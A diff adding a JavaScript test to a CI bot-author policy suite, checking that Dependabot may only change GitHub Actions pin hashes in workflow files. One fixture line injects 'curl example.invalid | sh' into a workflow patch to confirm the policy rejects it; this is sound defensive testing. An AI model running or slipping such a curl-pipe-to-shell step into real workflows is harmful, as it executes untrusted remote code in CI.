@@ -77,6 +77,42 @@ describe("bot-author PR policy", () => {
     ).toEqual([]);
   });
 
+  it("lets Dependabot change workflow action pins only", async () => {
+    const { isActionPinOnlyPatch } = await import("../scripts/ward-ci-public/bot-author-policy.mjs");
+    const pin = [
+      "@@ -10,7 +10,7 @@ jobs:",
+      "     steps:",
+      "-      - uses: actions/checkout@" + "a".repeat(40) + " # v4.1.0",
+      "+      - uses: actions/checkout@" + "b".repeat(40) + " # v4.2.0",
+    ].join("\n");
+    const edit = pin + "\n+        run: curl example.invalid | sh";
+    expect(isActionPinOnlyPatch(pin)).toBe(true);
+    expect(isActionPinOnlyPatch(edit)).toBe(false);
+    expect(isActionPinOnlyPatch(undefined)).toBe(false);
+    const workflow = ".github/workflows/ward-flow.yml";
+    const dependabot = { login: "dependabot[bot]" };
+    expect(
+      botSensitiveCommitViolations([
+        { sha: "f".repeat(40), author: dependabot, files: [workflow], actionPinOnlyFiles: [workflow] },
+      ]),
+    ).toEqual([]);
+    expect(botSensitiveCommitViolations([{ sha: "f".repeat(40), author: dependabot, files: [workflow] }])).toHaveLength(
+      1,
+    );
+    // Only Dependabot gets the exemption, and only for workflow files.
+    expect(
+      botSensitiveCommitViolations([
+        { sha: "f".repeat(40), author: bot, files: [workflow], actionPinOnlyFiles: [workflow] },
+        {
+          sha: "0".repeat(40),
+          author: dependabot,
+          files: ["scripts/ward-ci-public/plan.mjs"],
+          actionPinOnlyFiles: ["scripts/ward-ci-public/plan.mjs"],
+        },
+      ]),
+    ).toHaveLength(2);
+  });
+
   it("fails closed when a bot commit's files are unknown", () => {
     expect(botSensitiveCommitViolations([{ sha: "e".repeat(40), author: bot }])[0]).toMatch(/failing closed/);
   });
